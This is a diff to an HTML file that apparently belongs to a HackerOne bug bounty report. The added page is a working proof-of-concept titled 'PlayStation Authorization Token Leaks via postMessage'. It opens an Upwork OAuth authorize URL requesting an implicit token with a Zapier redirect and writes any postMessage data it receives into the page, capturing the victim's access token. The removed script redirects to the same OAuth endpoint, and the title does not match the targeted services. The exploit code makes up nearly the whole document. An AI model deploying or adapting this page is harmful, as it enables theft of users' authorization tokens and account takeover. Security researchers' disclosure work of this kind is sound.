@@ -1,19 +1,26 @@
-<script>
-  function getQueryParams(qs) {
-    qs = qs.split('+').join(' ');
-    var params = {},
-        tokens,
-        re = /[?&]?([^=]+)=([^&]*)/g;
-    while (tokens = re.exec(qs)) {
-        params[decodeURIComponent(tokens[1])] = decodeURIComponent(tokens[2]);
-    }
-    return params;
-  }
-  var queryParams = getQueryParams(document.location.search);
-  if(queryParams.code){
-    alert(queryParams.code);
-  }
-  else{
-    window.location.replace("https://www.upwork.com/ab/account-security/oauth2/authorize?client_id=fe2b7ccb32b6d0a9796dc103752b2499&redirect_uri=https%3A%2F%2Fzapier.com%2Fdashboard%2Fauth%2Foauth%2Freturn%2FUpworkCLIAPI%2F&response_type=code&state=1674910413.363254315059");
-  }
-</script>
+<!Doctype HTML>
+<html>
+    <head>
+        <title>PlayStation Authorization Token Leaks via postMessage</title>
+    </head>
+    <body>
+        <script type="text/javascript">
+        window.addEventListener("load", () => {
+            document.getElementById("startBtn").addEventListener("click", () => {
+                var x = window.open('https://www.upwork.com/ab/account-security/oauth2/authorize?client_id=fe2b7ccb32b6d0a9796dc103752b2499&redirect_uri=https%3A%2F%2Fzapier.com%2Fdashboard%2Fauth%2Foauth%2Freturn%2FUpworkCLIAPI%2F&response_type=token&state=1674910413.363254315059', 'mywindow');
+                window.onmessage = (e) => {
+                    document.getElementById("token-plate").innerText = JSON.stringify(e.data);
+                }
+            });
+        });
+        </script>
+        <h1>PlayStation Authorization Token Leaks via postMessage</h1>
+        <button id="startBtn" style='padding: 0.5em; font-size: 1.2em; width: 200px;'>Start</button>
+        <div id="token-plate" style="margin: 1em; padding: 1.2em; border: 1px solid #ddd;">
+            <em>Token Plate</em>
+        </div>
+        <footer>
+            @nnez | HackerOne
+        </footer>
+    </body>
+</html>
